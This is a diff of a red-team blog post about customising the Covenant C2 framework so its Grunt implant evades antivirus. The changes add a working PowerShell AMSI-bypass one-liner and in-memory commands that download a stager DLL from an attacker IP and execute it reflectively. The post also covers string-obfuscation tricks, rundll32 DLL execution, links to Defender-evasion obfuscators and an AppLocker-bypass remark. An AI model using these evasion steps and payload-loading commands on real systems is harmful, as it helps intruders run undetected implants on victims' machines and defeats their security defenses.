@@ -10,11 +10,14 @@ It is an open-source framework that enables developers to create their own __AV-
 
 ### 1) Entering the Covenant C2C use case 
 
+Whenever we download an offensive tool from the Internet, it comes as no surprise when it gets snapped up by an anti-virus solution. 
+AV vendors are certainly keeping a keen eye on tools posted publicly (insert conspiracy theory about Microsoft owning GitHub) and are reacting relatively quickly to push signatures for those tools. 
+However, it’s probably fair to say that these signatures are not particularly robust, and only really serve to catch those that don’t have the skills or knowledge to make the necesary modifications.
 
-After cloning the main repository of Covenant, we will modify some of its default words (Grunt, Jitter, Stage0, etc) to improve AV signature scanning capabilities.
+This holds true for __Covenant’s__ Windows __implant__ - Grunts. Therefore, we will try to alter the Covenant default installation. 
+
+After cloning the main repository of Covenant, we will modify some of its default words(Grunt, Jitter, Stage0, etc) to improve AV signature scanning capabilities.
 The bash script to automate this process is presented below:
-
-
 
 ```sh
 sudo git clone --recurse-submodules https://github.com/ZeroPointSecurity/Covenant.git /home/kali/Desktop/red/Covenant
@@ -165,28 +168,19 @@ dotnet run
 __Note:__ Please modify the script accordingly with your needs 🚩
 
  
-The new Covenant instance will generate the default Grunt using the __Monk__ word. Is up to the user to change the default Covenant Listener Profile. 
-Once the modified C# Monkstager has been downloaded it is possible to add further obfuscation using a combination or both of the following tools: 
+The new Covenant instance will generate the default Grunt using the __Monk__ word. Is up to the user to change the default __Covenant__ Listener Profile. 
 
+There might be more than one way to accomplish this. Another example of string concatenation follow below: 
 ```cpp
 Just another way to declare modified strings 
 {""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}";'
 {""---G-U-I-----D"":""{0}"",""T----y-p-----e"":{1},""---M-e-t----a"":""{2}"",""---I---V---"":""{3}"",""---E--n---cry---pt-e-d-M-e---ss---a-g-e"":""{4}"",""---H-----M--A--C"":""{5}""}".Replace("-","");'
 ```
 
-- [InvisibilityCloak:](https://github.com/xforcered/InvisibilityCloak) Obfuscation toolkit for C# post-exploitation tools that perform basics actions for a C# visual studio project.
-
-
-- [NET-Obfuscate:](https://github.com/BinaryScary/NET-Obfuscate) Obfuscate ECMA CIL (.NET IL) assemblies to evade Windows Defender
 
 
 ### 2) Covenant Custom C2C Profile 
 
-Whenever we download an offensive tool from the Internet, it comes as no surprise when it gets snapped up by an anti-virus solution. 
-AV vendors are certainly keeping a keen eye on tools posted publicly (insert conspiracy theory about Microsoft owning GitHub) and are reacting relatively quickly to push signatures for those tools. 
-However, it’s probably fair to say that these signatures are not particularly robust, and only really serve to catch those that don’t have the skills or knowledge to make the necesary modifications.
-
-This holds true for __Covenant’s__ Windows __implant__ - Grunts.
 
 Covenant does provide various means of changing the default Grunt behaviour, which can be leveraged in such a way as to remove the indicators that a particular security product is finding.
 This post will look at Traffic Profiles and Grunt Templates.
@@ -224,6 +218,10 @@ You obviously need to reiterate this process few times in order to find  all the
 
 
 ### 3) Grunt DLL with rundll32 - AvBypass
+
+Some people might have different opinions, but a well crafted payload can be dropped on disk safely in certain situations. 
+For this reason we now going to convert the grunt binary stage to a custom DLL that can be executed on the target machine or it could be used for __lateral__ __movement__ at different stage. 
+File write operations are so common that it's extremely hard for security products to alert just on that.
 
 From __Covenant__ we can create a __Grunt__ DLL that has an export compatible with __rundll32__. 
 
@@ -266,6 +264,15 @@ Now you should have your __Grunt__ checking in on __Covenant__.
   <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov3.JPG">
 </p> 
 
+Once the modified C# Monkstager has been downloaded and imported into Visual Studio it is possible to add further obfuscation using a combination or both of the following tools: 
+
+- [InvisibilityCloak:](https://github.com/xforcered/InvisibilityCloak) Obfuscation toolkit for C# post-exploitation tools that perform basics actions for a C# visual studio project.
+
+
+- [NET-Obfuscate:](https://github.com/BinaryScary/NET-Obfuscate) Obfuscate ECMA CIL (.NET IL) assemblies to evade Windows Defender
+
+
+We can go an extra mile here and we can perform some .NET reflection to execute or __Grunt__ stager.
 
 
 __Note:__ The most basic (although not very interesting) method of loading and running this code, is from disk using PowerShell🚩:
@@ -292,15 +299,18 @@ And note your new powershell __Grunt__ checking in on __Covenant__.
 </p>
 
 
-We could also download the DLL from a remote location as follow below:
+On the other hand we can keep our stager entirely in memory by downloading the DLL reflectively from a remote location as follow below:
 
 ```powershell 
+# Patch Amsi
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+
 PS > $dll = (new-object net.webclient).DownloadData("http://192.168.152.100:1234/monk-Avbypass.dll)
 PS > [System.Reflection.Assembly]::Load($dll)
 PS > [MonkStager.MonkStager]::Execute()
 ```
 
-This DLL technique can be particulary useful when dealing with __AppLocker__ bypass as it is common occurrence that the DLL __AppLocker__ rules are not enabled or enforced 🚩. 
+The usage of DLL execution can be particulary useful when dealing with __AppLocker__ bypass as it is common occurrence that the DLL __AppLocker__ rules are not enabled or enforced 🚩. 
 However we are not going to dig further around this topic, or at least not for now. 
 
 ### 4) Initial delivery 
@@ -328,8 +338,6 @@ the path of the process which will be used for process injection. In our case we
  <p align="center">
   <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov14.JPG">
 </p>
-
-
 
 
 Now that we have our malicious __.exe__ file we can move on and leverage the __GadgetToJScript__ project. 
